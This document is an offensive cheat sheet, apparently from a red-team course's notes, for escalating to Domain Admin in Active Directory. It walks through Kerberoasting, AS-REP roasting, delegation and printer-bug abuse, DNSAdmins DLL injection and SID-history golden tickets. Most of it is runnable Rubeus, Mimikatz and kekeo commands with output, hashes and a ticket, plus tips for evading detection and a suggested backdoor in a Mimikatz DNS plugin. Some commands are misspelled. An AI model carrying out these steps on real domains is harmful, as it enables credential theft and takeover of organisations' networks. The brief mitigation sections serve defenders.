---
title: Domain Privilege Escalation
category: Active Directory
order: 5
---

Lets talk about some attacks to carry out a domain privilege escalation in order to obtain a Domain Controller.

# Attacking Kerberos

## Kerberoasting

The Kerberos session ticket as known as `TGS` has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.

> **Note**: Service accounts are many times ignored. Password are rarely changed and have privileged access.

> **OPSEC Note**: Thousands of tickets are requests, is too hard of being detected. Since some fake SPN (honeypot) can be available, never get all the Kerberos tickets automatically and search for some specifically.


### Getting the TGS

First of all we need to find which users are used as *Service Accounts*:

* PowerView:
```powershell
Get-NetUser -SPN
```
* ADModule:
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
* ADSearch:
```powershell
C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(servicePrincipalName=*))"
```
After enum it, we need to request a TGS:

* PowerView:
```powershell
Get-NetUser -SPN | Request-SPNTicket
```

* ADModule:
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/mgmt-user.corp.local"
```

> **Note**: With `klist` you can check if the TGS has been granted.

Finally all tickets should be exported.

```powershell
Inovoke-Mimikatz -Command '"kerberos::list /export"'
```

* Rubeus

```
PS C:\Windows\Temp\Rubeus\>.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 2


[*] SamAccountName         : websvc
[*] DistinguishedName      : CN=websvc,CN=Users,DC=corp,DC=local
[*] ServicePrincipalName   : SNMP/adminsrv.corp.LOCAL
[*] PwdLastSet             : 2/17/2019 1:01:06 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Windows\Temp\Rubeus\hashes.kerberoast


[*] SamAccountName         : svcadmin
[*] DistinguishedName      : CN=svcadmin,CN=UsersDC=corp,DC=local
[*] ServicePrincipalName   : MSSQLSvc/mgmt.corp.local:1433
[*] PwdLastSet             : 2/17/2019 2:22:50 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Windows\Temp\Rubeus\hashes.kerberoast

[*] Roasted hashes written to : C:\Windows\Temp\Rubeus\hashes.kerberoast
```

You can also specify a user:

```
PS C:\Windows\Temp\Rubeus\>.\Rubeus.exe kerberoast /user:svcadmin /outfile:hashes.kerberoast
```
### Cracking the tickets

Once the tickets are exported it can be cracked with `john`, `hashcat` or `tgsrepcrack.py` tool:

```
python.exe .\tgsrepcrack.py wordlist.txt ticket.kirbi
```
To crack the ticket with hascat exists a script to export it to a hashcat format.

* https://github.com/jarilaos/kirbi2hashcat

```
haschat -a 0 -m 13100 wordlist.txt ticket.txt
```

### Mitigation

Since a lot of tickets are requested, we can see the logs in order to find all the kerberos tickets requests:

* Security Event ID **4769**: A Kerberos ticket was requested

```powershell
Get-WmiEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 |
?{$_.Mesage.split("`n")[8] -ne 'krbtgt' -and
$_.Message.split("`n")[8] -ne '*$' -and
$_.Message.split("`n")[3] -notlike '*$@*' -and
$_.Message.split("`n")[18] -like '*0x0*' -and
$_.Message.split("`n")[17] -like '*0x17*'} | select - ExpandProperty message
```

To prevent from kerberoasting attacks we have the following recommendations:

* Service Account Passwords should be hard to guess (greater than 25 characteres)
* Use Managed Service ACcounts (Automatic change of password periodically and deltegated SPN Management)
* Try to not run a service as a Domain Admin account.

### Set SPN

With enough privileges such as `GenericAll` or `GenericWrite`, a target user's SPN can be set to anything which is unique in the domain. We can then request a TGS without special privileges and the TGS can be kerberoasted.

We can enumerate the permissions for a group on ACLs:

* PowerView:
```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

We can also see if a user already has a SPN:

* PowerView (dev):
```powershell
Get-DomainUser -Identity user01 | select serviceprincipalname
```
* ADModule:
```powershell
Get-ADUser -Identity user01 -Properties ServicePrincipalName | select ServicePrincipalName
```

And we can force the SPN to a user:

* PowerView (dev):
```powershell
Set-DomainObject -Identity user01 -Set @{serviceprincipalname='ops/whatever01'}
```

* ADModule:
```powershell
Set-ADUser -Identity user01 -ServicePrincipalNames @{Add='ops/whatever01'}
```

Once we have a SPN set, we can request a TGS:

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object Sytem.IdentityModel.Token.KerberosRequestorSecurityToken -ArgumentList "ops/whatever01"
```
And we can export the tickets to the disk:

```powershell
Inovoke-Mimikatz -Command '"kerberos::list /export"'
```
And finally same as *Kerberoasting*, you can crack the ticket with `tgsrepcrack.py`.

## AS-REP Roasting

If a users account does not have the flag _"Do not require Kerberos pre-authentication"_ in _UserAccountControl_ settings which means kerberos preauth is disabled, it is possible to grab users AS-REP and brute-force it offline.

This configuration is also enabled on the User Object and is often seen on accounts that are used on Linux Systems.

> **OPSEC Notes**: Same as Kerberoasting don't run `asreproast` by itself as this will roast every account in the domain with pre-authentication not set.

### Users with No-Preauth set

We need to enumerate accounts with Kerberos Preauth disabled:

* PowerView (dev):
```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```

* ADModule:
```powershell
Get-ADUser -Filter {DoesNotRequiredPreAuth -eq $True} -Properties DoesNotRequiredPreAuth
```

* ADSearch:
```powershell
C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
```

### Disable PreAuth

A user with `GenericAll` or `GenericWrite`, kerberos preauth can be disabled.

* PowerView (dev):
```powershell
Set-DomainObject -Identity user01 -XOR @{useraccountcontrol=4194304} -Verbose
```
### Cracking the tickets

We can request an encrypted AS-REP for offline brute-force. To do that task we can use `ASREPRoast` module:

```powershell
Import-Module ASREPRoast.ps1
Get-ASREPHash -UserName user01 -Verbose
```
After getting the ticket we can crack it with `john` or `hashcat`:

```
john user01.ticket --wordlist=wordlist.txt
hashcat -a 0 -m 18200 user01.ticket wordlist.txt
```

# Kerberos Delegation

_Kerberos Delegation_ allows to **reuse the end-user credentials** to access resources hosted on a different server. This is typically useful in multi-tier service or applications where Kerberos Double Hop is required.

For example, users authenticates to a web server and web server makes requests to a database server. The web server can request access to resources on the database server as the user and not as the web server's service account.

> **Note**: The service account for web service must be trusted for delegation to be able to make requests as a user. So the server can **Impersonate** the user.

There are two types of delegation:

## Unconstrained Delegation

When set for a particular service account, unconstrained delegation allows delegation to any service to any resource on the domain as a user.

When unconstrained delegation is enabled, the domain controller places uset's TGT inside TGS. When that is presented to the server with unconstrained delegation, the TGT is extracted from TGS and sotred in LSASS. This way the server can reuse the user's TGT to access any other resource as the user.

> **Note**: Allows the first hop server to request access to **any service** on **any computer** in the domain.

We need to discover computers which have **unconstrained delegation** enabled.

* PowerView:
```powershell
Get-NetComputer -UnConstrained
```
* ADModule:
```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```
* ADSearch:
```powershell
C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
```

> **Note**: The **DC** always have the unconstrained delegation **enabled**.

To exploit the unconstrained delgation and extract the user's TGT from lsass, we need to compromise the server as local admin.

```powershell
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```
If any interesting ticket is located on the server, we will need to wait until a interesting user connects to the compromised server. We can use `Invoke-UserHunter` to see if the targeted user connects to the server:

```powershell
Invoke-UserHunter -ComputerName srv01 -Poll 100 -UserName Administrator -Delay 5 -Verbose
```

If we find a interesting ticket, it could be reused using _Pass-The-Ticket_:

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
```

### Printer Bug

We can abuse the printer bug if we don't want to wait for a Domain Admin to connect to the server where Unconstrained Delegation is enabled.

We can start listenting for new tickets with Rubeus on the server which have Unconstrained Delegation enabled.

```
.\Rubeus.exe monitor /inverval:5 /nowrap [/targetuser:admin]
```

With the printer bug we can force the Domain Controller to connect to any server.

```
.\MS-RPRN.exe \\dc01.corp.local \\udeleg.corp.local
```

On the listener we will receive a Ticket TGT from the DC machine account `DC01$`:

```
[*] 6/10/2022 4:29:53 PM UTC - Found new TGT:

  User                  :  DC01$@CORP.LOCAL
  StartTime             :  6/10/2022 6:32:58 AM
  EndTime               :  6/10/2022 4:32:57 PM
  RenewTill             :  6/16/2022 9:01:51 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFxTCCBcGgAwIBBaEDAgEWooIEmjCCBJZhggSSMIIEjqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBDYwggQyoAMCARKhAwIBAqKCBCQEggQgzdiOtwS+cAcLOZJMO+dPDVk+nVz8Gl6X7LNl+FVx8GU29naNwzNLEm6+GtbrKbuu+5/cmP3SPGeRZZPcggT7rM9aYzrIpn2xZadXN5SviKI47opFETnalXeuoIco/LjoYVzAsAjFrpZ0cXUgVXMJyT/X2YL0qDAQHNArzenfXiMd+Yzy2xPdjiPteusMzbkWx7gz92mWtV+JFHSocAsbVCTtkl8BXVuT67I55U9tGit5+TAtfg+CfBUZlLNfZaMtPjDs8hyinR2qyo2/NaiROyzyUFUhOZaHjhdX9G3zFDKvCPVXx0aiWPmHotGfR2HhAjy281DqX57xpA4vl/TvksgYj0nTz1S3JLhZyKfJfJbpoLDXLsNipSN6lypcxGdKwTyGQrxKT+ftDlI1ui08WBR1YSDCJCRa6u5JczvHO2bHLOTxn7Dpi7TUrBNVyxs5fYXaBA4nMf1J8luJQRp22bTBpXrgH8zd9cNTmTb/9q0bNCiWV16cEYnDTWxua7APwY4qSwVZWA//6ZSbwChQAq2g7m6tDls9v60oiMZRx957xAFeOfhoL1eEcEcO8z7CL9c4KpZBteWSNWuk/4kHCFREHDFGKRPtWV4kPMEty9d9Mk28xwj3njdoNVQvo1K7JZHNamZukSH2oty3uX6cvWe4T/gT6dEz1dzr0ENsWCwtTEGumxligGyWTcxyJdFj4Aul6aeRumiewJvS6GRZxlqln7gCL3Rw4NlN6vMMzSJsvpW/KbS1wtJlP5FgpUYmfZupMx1R3hEKoVpDiAOX0HqK7/tXmn/+zMJeajLscOCll6FCPP/lysRwn6HHSNjD8rjh3Ylw9hqpZv/Aqm+nvc9SUkkOqsJH2XfI3TmxmzViweZ/vdyK/HeTwfaEsTpyFtarsz8uutVSyK9VzepzU/PoTOc/SmpHo1BUhvsCUQjA0njFslQ0loLJydoXkXaWRcfbGWET/jQa3cNHPoK3jg5VY4njENzp7D59Nt7a/s2Lrj8xe3365z7YDOFxIaTUQGWUC0qr9XOQ+EDDc80/CcYyDrUN79Z7wqbbl/7BkzTtqd1wbVgSYTVhiWmnLALvBBXcPqazZv7DN8FlfDwDau6plwiKZlSjKJN7ecJwgy5xf5HixsuLO9Sm+bfjuElCjhVvklyrt6oZ/G7vm+KqhJA7SAk/9fnHlWbV4Eon8XPqt/pirKgdP/Rv6dPECw7ybwTpytHJh1Wqp7456opEFZGYq8mOWCFsirMRU+G7EWNUVr3AxN1sbcwFUdb4mVql4onFCMgRIv6F4UkCKRNej5lG6SLfRCCxg85dytrWVRYs7GO8I968dFtoxAI/a4WjjPeA0y1J1zrc5aMeYhOD5XHx4XMkz7+Kd0FLNSmreNhQsHtkx4WIaqTg6/0qIgvlo4IBFTCCARGgAwIBAKKCAQgEggEEfYIBADCB/aCB+jCB9zCB9KArMCmgAwIBEqEiBCAfSXFmixqxdagZDdk9m0Rp5BX7xWnwbLflr8znMe5aCqEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIWMBSgAwIBAaENMAsbCURDT1JQLURDJKMHAwUAYKEAAKURGA8yMDIyMDYxMDEzMzI1OFqmERgPMjAyMjA2MTAyMzMyNTdapxEYDzIwMjIwNjE3MDQwMTUxWqgcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKkvMC2gAwIBAqEmMCQbBmtyYnRndBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUw=

```

Finally we can import it with Rubeus, execute a Pass-The-Ticket and do a DCSync Attack to retrieve Administrator NTLM hash.

```powershell
.\Rubeus.exe ptt /ticket:<b64ticket>
```

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\Administrator"'
```

## Constrained Delegation

When Contrained Delegation is enabled on a service account, allows access only to specified services on specified computers as a user.

A typical scenario where constrained delegation is where a user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user's authorization.

> **Note**: Allows the first hop server to request access only to **specified services** on **specified computers**. 

To impersonate the user, Service for user as known as `S4U` extension is used which provides two extensions:

* **Service for User to Self (S4U2self)**: Allows a service to obtain a forwardable TGS to itself on behalf a user with just the user principal name without supplying a password. The service account must have the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` (T2A4D UserAccountControl attribute).

* **Service for User to Proxy (S4U2proxy)**: Allows a service to obtain a TGS to a second service on behalf of a user. The attribute `msDS-AllowedToDelegate` attribute contains a list of SPNs to which the user tokens can be forwarded.


To abuse constrained delegation, we need to have access to the web service account. If we have access to that account, it is possible /to access the services listed in `msDS-AllowedToDelegateTo` of the web service account as any user.

* PowerView Dev:
```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```
* ADModule:
```
Get-ADObject -Filter {msDS-AllowerToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

We can use `asktgt` from `kekeo` to request a TGT.

```
.\kekeo.exe

kekeo # tgt::ask /user:websvC /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
```
Once we have the TGT, with kekeo we can request a TGS.

```
kekeo # tgs::s4u /tgt:TGT_websvC@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local|host/dcorp-mssql.dollarcorp.moneycorp.local

```
Finally with mimikatz we can inject the ticket on the current session:

```
.\Rubeus.exe ptt /ticket:TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_host~dcorp-mssql.dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi
```

> **Note**: The delegation occurs not only for the specified service but for any service running under the same account. The is no validation for the SPN specified.

So we can ask for other service on a machine, in case of having Constrained delegation on the DC we can ask to the LDAP TGS in order to do a DCSync attack.

* Rubeus

```powerhsell
.\Rubeus.exe asktgt /user:DCORP-ADMINSRV$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96 /outfile:ADMINSRV-TGT.kirbi

.\Rubeus.exe s4u /ticket:ADMINSRV-TGT.kirbi /impersonateuser:Administrator /outfile:Administrator-TGS

.\Rubeus.exe s4u /ticket:ADMINSRV-TGT.kirbi /tgs:Administrator-TGS_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"TIME/dcorp-dc.dollarcorp.moneycorp.local" /altservice:LDAP /ou
tfile:LDAP-Administrator

.\Rubeus.exe ptt /ticket:LDAP-Administrator_LDAP-dcorp-dc.dollarcorp.moneycorp.local

Invoke-Mimikatz -Command '"lsadump::dcsyinc /user:dcorp\Administrator"'
```
To abuse constrained delegation with Rubeus and request a TGT and TGS in a single command:

```powershell
.\rubeus.exe s4u /user:DCORP-ADMINSRV$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96 /impersonateuser:Administrator /msdsspn:"TIME/dcorp-dc.dollarcorp.moneycorp.local" /altservice:LDAP /ptt
```

## Mitigation

It is recommended to:

* Limit DA/Admin logins to specific servers.
* Set `Account is sensitive and cannot be delegated` flag for privileged accounts.

# DNSAdmins

It is possible for the members of the **DNSAdmins** group to load arbitrary DLL with the privileges of dns.exe which is `NT AUTHORITY\SYSTEM`.

In case the domain controllers also serves as DNS, this will provide us escalation to domain admin. We just need privileges to restart the DNS service.

> **Note**: By default does not have the privileges to restart the DNS service.

Enumerate the `DNSAdmins` group:

* PowerView:
```powershell
Get-NetGroupMember -GroupName "DNSAdmins"
```

* ADModule:
```powershell
Get-ADGRoupMember -Identity DNSAdmins
```

After compromise a member and from the privileges of DNSAdmins group, we can configure a `dll`:


* dnscmd.exe:
```
dnscmd.exe dc01 /config /serverlevelplugindll \\10.10.10.10\share\mimilib.dll
```

> **Note**: If `dnscmd` is not available, you can install `DNS Server` on the Server Manager.

* DNSServer Module (RSAT DNS):
```
$dnsettings = Get-DnsServerSetting -ComputerName dc01 -Verbose -All
$dnsettings.ServerLevelPluginDll = "\\10.10.10.10\share\mimilib.dll"
Set-DnsServerSetting -InputObject $dnsettings -ComputerName dc01 -Verbose
```

We need to restart the service:

```
sc.exe \\dc01.corp.local stop dns
sc.exe \\dc01.corp.local start dns
```

By default `mimilib.dll` logs all DNS queries on the following file:
```
c:\windows\sytem32\kiwidns.log
```

We can modify the source code of `kdns.c` from `mimikatz` source code in order to add a reverse shell or other type of backdoor.

```c
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
		system("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -e ZQBjAGgAbwAgACIAdABlAHMAdAAiAA==")   //THIS LINE
	}
	return ERROR_SUCCESS;
```

> **RedTeam Note**: If we put a reverse shell on the `mimilib.dll`, **DNS will not work properly since the reverse shell is closed**. Use another way to elevate privileges such as add the user to local administrators group.


## Restore config

After execute the attack we need to restore the previous config, so we need to remove the `ServerLevelPlugin` from the DNS Parameters registry.

```
reg query \\dc01\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
reg delete \\dc01\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

# Across Domains (SID History)

Domains in a same forest have an implicit two-way trust with other domains. There is a trust key between the parent and child domains.

There are two ways of escalating privileges between two domains of the same forest:

* Trust Tickets
* Krbtgt hash

## Child to Parent using Trust Tickets

We can escalate between domains using the trust tickets. An **inter-realm TGT** can be forged:

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:sub.corp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:05749eb179dbf3d3445e0a49d6701578 /service:krbtgt /targe
t:corp.local /ticket:C:\temp\trust_forest_tkt.kirbi"'
```
We are going to inject the SID History inse the inter-realm TGT which will be requestes to the parent domain DC. The ticket will look like that comes from the Enterprise Admins group which allows us to elevate privileges.

* **Invoke-Mimikatz**

|                   **Parameter**                   |                 **Description**                |
|:-------------------------------------------------:|:----------------------------------------------:|
| /domain:sub.corp.local                            | Current Domain FQDN                            |
| /sid:S-1-5-21-268341927-4156873456-1784235843     | Current Domain SID                             |
| /sids:S-1-5-21-280534878-1496970234-700767426-519 | SID of Enterprise Admins group (Parent Domain) |
| /rc4:05749eb179dbf3d3445e0a49d6701578             | RC4 of the trust key (parent$)                 |
| /user:Administrator                               | User to impersonate                            |
| /service:krbtgt                                   | Target service in the parent domain            |
| /target:corp.local                                | Parent Domain FQDN                             |
| /tiket:C:\Windows\Temp\trust_tkt.kirbi            | File to store the ticket                       |


Once we have the inter-realm TGT ticket forged we can ask for a TGS on the parent domain. We can ask a TGS for LDAP on the parent DC.

* asktgs.exe (kekeo_old)
```
.\asktgs.exe ./trust_tkt.kirbi LDAP/corp-dc.corp.local
```

* Rubeus.exe
```
.\Rubeus.exe asktgs /ticket:trust_tkt.kirbi /dc:corp-dc.corp.local /service:LDAP/corp-dc.corp.local /ptt
```

Finally we can inject in on the current session:

```powershell
.\Rubeus.exe ptt /ticket:LDAP.mcorp-dc.moneycorp.local.kirbi
```

And execute a DCSync attack and Over-Pass-The-Hash to fully control the DC of the parent domain:

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\Administrator /domain:moneycorp.local"'
.\Rubeus.exe asktgt /domain:corp.local /user:Administrator /rc4:71d04f9d50ceb1f64de7a09f23e6dc4c /dc:corp-dc.moneycorp.local /ptt
Enter-PSSession -ComputerName corp-dc.moneycorp.local
```

## Child to Parent using krbtgt hash

We can also escalate to the root domain with the krbtgt hash of the current domain.

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:sub.corp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /ticket:C:\temp\trust_forest_tkt.kirbi"'
```
* **Invoke-Mimikatz**

|                   **Parameter**                   |                 **Description**                |
|:-------------------------------------------------:|:----------------------------------------------:|
| /domain:sub.corp.local                            | Current Domain FQDN                            |
| /sid:S-1-5-21-268341927-4156873456-1784235843     | Current Domain SID                             |
| /sids:S-1-5-21-280534878-1496970234-700767426-519 | SID of Enterprise Admins group (Parent Domain) |
| /user:Administrator                               | User to impersonate                            |
| /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d          | krbtgt hash of Current Domain                  |
| /tiket:C:\Windows\Temp\trust_tkt.kirbi            | File to store the ticket                       |



Once created we can import and we don't need to ask for a TGS.

```
.\Rubeus.exe ptt /ticket:trust_forest_tkt.kirbi

Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\Administrator /domain:moneycorp.local"'
```

Avoid Suspicious logs by using DC machine accounts.

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:DCORP-DC$ /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-268341927-41456871508-1792461683 /groups:516 /sids:S-1-5-21-560323961-2032768757-2425134131-516,S-1-5-9 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /ptt"'
```

> **RedTeam Notes:** Avoid suspicious logs adding
>
> `/groups:516`
>
> `/sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9`
>
>
> S-1-5-21-280534878-1496970234-700767426-516 - Domain Controllers
>
> S-1-5-9 - Enterprise Domain Controllers


## SID Filtering (Defending)

**SID Filtering** avoids attacks which abuses SID history attribute across forest trust.

By default SID Filtering is enabled on all inter-forests trusts. Intra-Forests trusts are assumed secured by default. But, since SID Filtering has potential to break applications and user access, it is often disabled.

Microsoft considers a forest and no the domain to be a security boundary so its disabled by default.

* ParentChild Trust -> Disabled
* External Trust -> Enabled

## Selective Authentication (Defending)

In an inter-forest trust (External Trust), if Selective Authentication is configured, users between the trusts will not be automatically authenticated. Individual access to domains and servers in the trusting domain/forest should be given.